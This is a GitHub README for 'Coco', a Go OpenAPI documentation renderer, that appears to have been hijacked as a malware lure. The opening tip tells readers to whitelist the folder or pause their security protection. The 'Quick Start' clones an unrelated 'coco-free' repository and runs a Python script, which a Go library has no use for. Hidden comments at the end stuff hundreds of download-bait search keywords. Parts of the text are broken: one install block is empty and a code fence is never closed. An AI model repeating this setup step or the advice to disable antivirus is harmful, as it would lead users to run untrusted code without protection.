# Coco


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/JadeDoctorWire/coco-free.git
cd coco-free
python run.py
```


<p align="center">
<img align="center" width="160px" src="docs/images/coco.png">
</p>

<p align="center">An elegant, lightweight, and beautiful OpenAPI documentation renderer built for Go developers</p>

<div align="center">

[![Go Version](https://img.shields.io/badge/Go-%3E%3D%201.21-blue)](https://go.dev/)
[![Go Reference](https://pkg.go.dev/badge/github.com/leehainuo/coco.svg)](https://pkg.go.dev/github.com/leehainuo/coco)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

</div>

## Preview

<p align="center">
  <img src="docs/images/coco-light.png" alt="Coco Light Theme" width="45%">
  <img src="docs/images/coco-dark.png" alt="Coco Dark Theme" width="45%">
</p>

## What is Coco?

English | [简体中文](docs/zh/README.md)

Coco is an elegant, lightweight, and beautiful Go library that renders OpenAPI/Swagger specifications into stunning interactive API documentation. Zero dependencies, single-file bundle, perfectly embedded into Go binaries. Supports OpenAPI 2.0 and 3.0+ specifications with seamless integration into any Go web framework.

#### Advantages of Coco:

* **Elegant DX** - Minimal API design, integrate in just 30 seconds
* **Beautiful UI** - Built with Vue 3 + TailwindCSS, supports automatic light/dark theme switching
* **Framework Agnostic** - Works with all Go web frameworks (Gin, Echo, Fiber, Chi, net/http, etc.)
* **Feature Complete** - Built-in API testing, spec export, request history, internationalization, and more

## Core Features

* **Internationalization** - Built-in English and Chinese support, extensible for more languages
* **Zero Dependencies** - Pure Go implementation, frontend assets fully embedded, no external tools required
* **Framework Agnostic** - Compatible with all Go web frameworks (Gin, Echo, Fiber, Chi, net/http, etc.)
* **Flexible Configuration** - Rich configuration options to meet various customization needs
* **API Testing** - Built-in interactive debug panel for instant API testing
* **Spec Export** - One-click export of OpenAPI/Swagger specification files
* **Request History** - Automatically saves debug history for easy review and reuse
* **High Performance** - Embedded static assets, single-file bundle, no additional HTTP requests


### Using Swag (Recommended)

**Step 1: Install Swag**

```bash
```

**Step 2: Add annotations to your code**

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

// @title           My API
// @version         1.0
// @description     This is a sample API
// @host            localhost:8000
// @BasePath        /api

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/hello", handleHello)
    
    // Mount Coco docs (Swag generates docs/swagger.json)
    mux.Handle("/docs/", coco.New("./docs/swagger.json"))
    
    http.ListenAndServe(":8000", mux)
}

// @Summary      Hello endpoint
// @Description  Returns a greeting message
// @Tags         example
// @Accept       json
// @Produce      json
// @Success      200  {string}  string  "Hello, World!"
// @Router       /hello [get]
func handleHello(w http.ResponseWriter, r *http.Request) {
    w.Write([]byte("Hello, World!"))
}
```

**Step 3: Generate docs and run**

```bash
# Generate OpenAPI documentation
swag init


### Other Usage Methods

**Load from local file**
```go
handler := coco.New("./openapi.json")
```

**Load from URL**
```go
handler := coco.New("", coco.SpecURL("https://example.com/openapi.json"))
```

**Load from byte array**
```go
handler := coco.New("", coco.Spec(specBytes))
```

**For more configuration and integration options, see [Full Documentation](./docs/en/)**

## Integration Examples

### net/http

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/users", handleUsers)
    
    // Mount documentation
    mux.Handle("/docs/", coco.New("./openapi.json",
        coco.Title("User API"),
    ))
    
    http.ListenAndServe(":8000", mux)
}
```

### Gin

```go
package main

import (
    "github.com/gin-gonic/gin"
    "github.com/leehainuo/coco"
)

func main() {
    r := gin.Default()
    
    // Your API routes
    r.GET("/api/users", getUsers)
    
    // Mount documentation
    r.Any("/docs/*any", gin.WrapH(coco.New("./openapi.json",
        coco.Title("User API"),
    )))
    
    r.Run(":8000")
}
```

### Echo

```go
package main

import (
    "github.com/labstack/echo/v4"
    "github.com/leehainuo/coco"
)

func main() {
    e := echo.New()
    
    // Your API routes
    e.GET("/api/users", getUsers)
    
    // Mount documentation
    e.Any("/docs/*", echo.WrapHandler(coco.New("./openapi.json",
        coco.Title("User API"),
    )))
    
    e.Start(":8000")
}
```

### Fiber

```go
package main

import (
    "net/http"
    "github.com/gofiber/fiber/v3"
    "github.com/gofiber/fiber/v3/middleware/adaptor"
    "github.com/leehainuo/coco"
)

func main() {
    app := fiber.New()
    
    // Your API routes
    app.Get("/api/users", getUsers)
    
    // Mount documentation
    handler := coco.New("./openapi.json",
        coco.Title("User API"),
    )
    app.All("/docs/*", adaptor.HTTPHandler(http.HandlerFunc(handler.ServeHTTP)))
    
    app.Listen(":8000")
}
```

### Chi

```go
package main

import (
    "net/http"
    "github.com/go-chi/chi/v5"
    "github.com/leehainuo/coco"
)

func main() {
    r := chi.NewRouter()
    
    // Your API routes
    r.Get("/api/users", getUsers)
    
    // Mount documentation
    r.HandleFunc("/docs/*", func(w http.ResponseWriter, req *http.Request) {
        handler := coco.New("./openapi.json",
            coco.Title("User API"),
        )
        handler.ServeHTTP(w, req)
    })
    
    http.ListenAndServe(":8000", r)
}
```

## Configuration Options

### Spec Sources

```go
// Load from file path
coco.New("./openapi.json")

// Load from byte array
coco.New("", coco.Spec(specBytes))

// Load from remote URL
coco.New("", coco.SpecURL("https://example.com/openapi.json"))
```

### UI Configuration

```go
// Set document title
coco.Title("My API Documentation")

// Set theme: "light", "dark", "auto"
coco.Theme("dark")

// Set language: "en", "zh"
coco.Lang("en")
```

### Feature Toggles

```go
// Enable/disable debug panel (enabled by default)
coco.EnableDebug(true)

// Enable/disable export feature (enabled by default)
coco.EnableExport(true)

// Enable/disable history (enabled by default)
coco.EnableHistory(true)
```

## OpenAPI Generation Tools Integration

### Using Huma v2

```go
package main

import (
    "context"
    "net/http"
    
    "github.com/danielgtaylor/huma/v2"
    "github.com/danielgtaylor/huma/v2/adapters/humago"
    "github.com/leehainuo/coco"
)

func main() {
    mux := http.NewServeMux()
    api := humago.New(mux, huma.DefaultConfig("My API", "1.0.0"))
    
    // Register your API
    huma.Register(api, huma.Operation{
        OperationID: "get-users",
        Method:      http.MethodGet,
        Path:        "/api/users",
        Summary:     "Get users",
    }, func(ctx context.Context, input *struct{}) (*struct{}, error) {
        return &struct{}{}, nil
    })
    
    // Get OpenAPI spec and mount documentation
    spec, _ := api.OpenAPI().MarshalJSON()
    mux.Handle("/docs/", coco.New("",
        coco.Spec(spec),
        coco.Title("My API - Huma"),
    ))
    
    http.ListenAndServe(":8000", mux)
}
```

### Using Swag

```go
package main

import (
    "net/http"
    "github.com/leehainuo/coco"
)

// @title My API
// @version 1.0
// @description This is my API
// @host localhost:8000
// @BasePath /api

func main() {
    mux := http.NewServeMux()
    
    // Your API routes
    mux.HandleFunc("/api/users", getUsers)
    
    // Mount documentation (swag generates docs/swagger.json)
    mux.Handle("/docs/", coco.New("./docs/swagger.json",
        coco.Title("My API - Swag"),
    ))
    
    http.ListenAndServe(":8000", mux)
}
```

Generate documentation before running:
```bash
swag init
```

## Themes and Languages

### Theme Options

- `light` - Light theme
- `dark` - Dark theme
- `auto` - Follow system (default)

### Language Options

- `en` - English (default)
- `zh` - Chinese

Users can switch themes and languages anytime in the top-right corner of the interface.

## Documentation

- **English Docs**: [docs/en/](./docs/en/) - Complete English documentation
- **中文文档**: [docs/zh/](./docs/zh/) - 完整的中文使用指南
- **Documentation Home**: [docs/](./docs/) - Choose your language / 选择你的语言

## Complete Examples

Check the [example/framework](./example/framework) directory for complete examples:

- **net/http** - Standard library examples
- **Gin** - Gin framework integration
- **Echo** - Echo framework integration
- **Fiber** - Fiber v3 framework integration
- **Chi** - Chi router integration

Each framework provides examples for both Huma and Swag OpenAPI generation methods.

## 📚 Documentation

- **English**: [docs/en/](./docs/en/)
- **中文**: [docs/zh/](./docs/zh/)

## 🤝 Contributing

Contributions, issues, and suggestions are welcome!

If you're using Coco or find it helpful, please give us a Star ⭐

## License

MIT License - See [LICENSE](LICENSE) file for details

## Give a Star! ⭐

If you like this project or are using it to learn or build your solution, please give it a Star to get updates on new releases. Your support matters!

---

**Made with ❤️ by [leehainuo](https://github.com/leehainuo)**


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- coco-free - tool utility software - download install setup -->
<!-- coco-free framework | compile coco-free library | latest version coco-free copy | modular coco-free downloader | 2026 coco-free framework | fast coco-free generator | easy coco-free binding | docs coco-free port | offline coco-free creator | extensible coco-free compressor | demo coco-free | windows coco-free converter | lightweight coco-free program | coco-free downloader | download for linux best coco-free mirror | top coco-free | coco-free converter | getting started coco-free extension | execute coco-free analyzer | get coco-free plugin | launch lightweight coco-free | free coco-free debugger | latest version minimal coco-free client | simple coco-free | run on windows modern coco-free | linux coco-free | github coco-free binding | best coco-free sdk | open coco-free | example coco-free module | arch coco-free analyzer | windows coco-free | cross platform coco-free wrapper | fedora coco-free converter | coco-free engine | is coco free legit | cross platform coco-free framework | top coco-free port | run on mac coco-free api | coco free reddit | coco-free parser | arch best coco-free package | download coco-free validator | compile coco-free service | run on windows coco-free gui | run on linux coco-free extension | how to setup coco-free web | download for linux lightweight coco-free | how to setup coco-free | how to deploy coco-free framework -->
<!-- how to configure coco-free debugger | offline coco-free engine | wiki coco-free gui | github portable coco-free | run on mac extensible coco-free tester | 2025 coco-free | free download coco-free | open source online coco-free utility | powerful coco-free | github coco-free | secure coco-free | how to run reliable coco-free | setup coco-free reader | docs local coco-free utility | debian coco-free tester | download for linux powerful coco-free | latest version coco-free analyzer | coco-free program | coco free help | cross platform coco-free viewer | low latency coco-free utility | new version coco-free program | coco free alternative | open source coco-free extractor | tar.gz coco-free platform | download for mac coco-free viewer | docs coco-free encoder | updated coco-free checker | download for mac top coco-free | how to install coco-free | get coco-free library | minimal coco-free library | run on linux coco-free | example coco-free tool | online coco-free tracker | coco-free creator | source code coco-free validator | macos coco-free client | cross platform coco-free sdk | coco-free encoder | free easy coco-free | coco free saas | demo coco-free clone | linux safe coco-free | lightweight coco-free | self hosted coco-free port | how to deploy coco-free debugger | build coco-free web | coco-free web | coco free documentation -->
<!-- install coco-free | fast coco-free encoder | open source coco-free package | updated coco-free | examples coco-free | coco-free logger | how to setup coco-free extractor | how to deploy coco-free api | free download coco-free downloader | new version coco-free reader | powerful coco-free encoder | coco-free editor | debian coco-free desktop | git clone coco-free logger | configure coco-free library | how to configure coco-free app | coco-free desktop | coco-free copy | how to install coco-free viewer | online coco-free editor | zip native coco-free | quick start stable coco-free | how to use coco-free analyzer | coco free podcast | 2025 coco-free converter | sample coco-free | low latency coco-free module | how to deploy simple coco-free | how to use coco-free tester | debian best coco-free | coco free blog | coco-free generator | free coco-free decoder | download for windows coco-free monitor | coco free book | coco free download | coco free test | windows coco-free extractor | free download high performance coco-free | examples stable coco-free service | demo coco-free addon | coco-free gui | top coco free | guide fast coco-free | offline coco-free mobile | free coco-free clone | documentation coco-free cli | guide modular coco-free | download coco-free uploader | example coco-free compressor -->
<!-- download for linux coco-free api | sample coco-free cli | fast coco-free logger | stable coco-free clone | debian safe coco-free | examples coco-free mirror | advanced coco-free package | download for mac coco-free mirror | tar.gz coco-free module | arch free coco-free builder | minimal coco-free mobile | source code self hosted coco-free viewer | 2025 low latency coco-free | linux open source coco-free generator | how to build coco-free downloader | git clone coco-free addon | run on linux coco-free scanner | coco free example | local coco-free platform | best coco-free application | coco free automation | start cross platform coco-free addon | compile coco-free wrapper | modular coco-free platform | use coco-free checker | low latency coco-free | build coco-free app | compile high performance coco-free | is coco free safe | execute coco-free software | high performance coco-free tool | easy coco-free utility | run on mac modern coco-free | customizable coco-free | updated coco-free utility | configurable coco-free optimizer | download for windows coco-free mobile | customizable coco-free clone | fedora coco-free binding | extensible coco-free tool | coco free docker | macos coco-free | macos coco-free app | free download coco-free fork | cross platform coco-free decoder | windows coco-free mobile | offline coco-free parser | how to build lightweight coco-free | open coco-free copy | ubuntu coco-free editor -->
<!-- download coco-free | examples safe coco-free | updated coco-free decoder | deploy coco-free | use coco-free mirror | build coco-free cli | coco-free package | easy coco-free compressor | download for linux cross platform coco-free | configure coco-free service | coco-free library | customizable coco-free mirror | portable coco-free | coco free reference | safe coco-free client | stable coco-free tracker | guide coco-free optimizer | run on linux low latency coco-free | reliable coco-free gui | deploy coco-free generator | documentation coco-free | download for mac coco-free sdk | extensible coco-free | customizable coco-free reader | coco-free optimizer | how to use simple coco-free | linux reliable coco-free | self hosted coco-free | extensible coco-free copy | how to download coco-free alternative | easy coco-free tester | updated coco-free plugin | github coco-free editor | run on mac minimal coco-free | minimal coco-free gui | offline coco-free generator | launch coco-free gui | how to build coco-free mirror | native coco-free monitor | launch coco-free app | arch coco-free | portable coco-free parser | lightweight coco-free binding | download for mac coco-free generator | start coco-free uploader | github coco-free uploader | modular coco-free | production ready coco-free plugin | how to install production ready coco-free viewer | coco-free debugger -->
<!-- documentation open source coco-free | download powerful coco-free | launch coco-free | best coco-free | macos coco-free software | reliable coco-free client | zip coco-free alternative | configurable coco-free app | how to configure coco-free tool | start coco-free parser | download for mac coco-free library | github coco-free generator | sample top coco-free parser | offline coco-free cli | documentation coco-free sdk | advanced coco-free copy | tar.gz coco-free reader | configurable coco-free extractor | new version coco-free platform | execute self hosted coco-free | walkthrough coco-free web | self hosted coco-free generator | advanced coco-free logger | coco-free server | deploy coco-free gui | updated portable coco-free | examples coco-free gui | coco free handbook | coco-free application | documentation coco-free viewer | setup coco-free | coco free fix | local coco-free extension | production ready coco-free library | open source coco-free | fedora coco-free gui | coco-free builder | setup configurable coco-free | configurable coco-free decoder | minimal coco-free | native coco-free | fast coco-free utility | 2026 coco-free editor | how to deploy coco-free plugin | run on windows coco-free viewer | git clone coco-free replacement | wiki coco-free mirror | coco free kubernetes | ubuntu coco-free copy | coco-free software -->
<!-- coco free article | examples coco-free alternative | free coco-free plugin | coco-free module | 2026 coco-free package | download coco-free tracker | run on linux lightweight coco-free mobile | customizable coco-free wrapper | coco free vs | reliable coco-free builder | source code reliable coco-free | arch coco-free tool | latest version coco-free | advanced coco-free app | run coco-free creator | portable coco-free api | secure coco-free editor | reliable coco-free desktop | install portable coco-free application | coco-free checker | setup coco-free platform | coco-free mobile | lightweight coco-free replacement | quick start coco-free mobile | setup easy coco-free library | low latency coco-free service | download high performance coco-free encoder | open source coco-free mirror | how to setup fast coco-free | use coco-free | ubuntu best coco-free | examples high performance coco-free | coco-free client | reliable coco-free addon | coco-free monitor | source code coco-free app | execute coco-free downloader | customizable coco-free converter | linux powerful coco-free | run coco-free validator | open source coco-free creator | secure coco-free service | free coco-free mobile | coco-free extension | tutorial fast coco-free monitor | cross platform coco-free alternative | best coco-free scanner | compile coco-free software | free coco free | run coco-free extension -->
<!-- sample native coco-free monitor | quickstart coco-free viewer | github coco-free clone | zip coco-free validator | github coco-free sdk | online coco-free client | stable coco-free fork | linux native coco-free | source code coco-free | how to download coco-free decoder | free coco-free | docs best coco-free | minimal coco-free uploader | git clone coco-free creator | safe coco-free mobile | free best coco-free | coco-free addon | native coco-free cli | simple coco-free client | run on windows coco-free service | cross platform coco-free compressor | top coco-free clone | walkthrough cross platform coco-free | coco free support | coco free webinar | examples simple coco-free | launch open source coco-free tracker | coco-free viewer | easy coco-free app | lightweight coco-free creator | run on windows coco-free server | configurable coco-free downloader | configurable coco-free sdk | cross platform coco-free | ubuntu coco-free downloader | examples top coco-free | low latency coco-free encoder | start coco-free | centos coco-free encoder | run secure coco-free fork | quick start coco-free copy | secure coco-free logger | fast coco-free | install coco-free optimizer | online coco-free web | walkthrough self hosted coco-free | launch coco-free generator | cross platform coco-free engine | 2026 coco-free viewer | macos high performance coco-free validator -->
<!-- 2026 safe coco-free desktop | walkthrough coco-free | coco-free alternative | 2025 coco-free builder | coco-free utility | ubuntu online coco-free binding | getting started coco-free uploader | minimal coco-free generator | open coco-free cli | open coco-free parser | configurable coco-free | coco free bug | modular coco-free mirror | fast coco-free gui | new version coco-free cli | example coco-free extension | how to run coco-free application | 2026 coco-free | free coco-free tool | top coco-free client | coco free ci cd | portable coco-free cli | docs coco-free | walkthrough coco-free extractor | how to download coco-free | source code coco-free module | coco free workflow | linux coco-free optimizer | lightweight coco-free analyzer | build coco-free | run on windows reliable coco-free | free coco-free compressor | build coco-free engine | coco free pipeline | deploy coco-free logger | offline coco-free decoder | customizable coco-free tester | modular coco-free engine | high performance coco-free package | run on mac coco-free converter | how to run portable coco-free | quickstart coco-free converter | ubuntu free coco-free replacement | high performance coco-free | quick start coco-free desktop | offline coco-free | beginner safe coco-free | free coco-free package | coco free devops | download for windows reliable coco-free -->
<!-- get coco-free clone | guide coco-free | run on linux coco-free analyzer | how to use coco-free | 2025 native coco-free engine | modern coco-free tool | coco-free api | wiki free coco-free replacement | coco free not working | launch coco-free mobile | sample coco-free plugin | how to setup lightweight coco-free generator | top coco-free service | configurable coco-free application | tutorial coco-free validator | online coco-free | native coco-free fork | demo minimal coco-free | tar.gz coco-free | fedora coco-free extension | configure coco-free | execute coco-free reader | how to configure coco-free | free download coco-free port | open source coco-free gui | sample native coco-free | self hosted coco-free server | production ready coco-free engine | modern coco-free | self hosted coco-free parser | getting started coco-free parser | download for windows coco-free checker | run coco-free alternative | coco free benchmark | download for linux coco-free desktop | guide coco-free compressor | tutorial advanced coco-free reader | deploy coco-free tool | github coco-free tracker | coco free github | launch coco-free copy | run coco-free fork | safe coco-free | linux coco-free library | how to use coco-free monitor | free download advanced coco-free alternative | compile open source coco-free | coco-free validator | easy coco-free mobile | lightweight coco-free wrapper -->

<!-- Last updated: 2026-06-09 18:18:37 -->
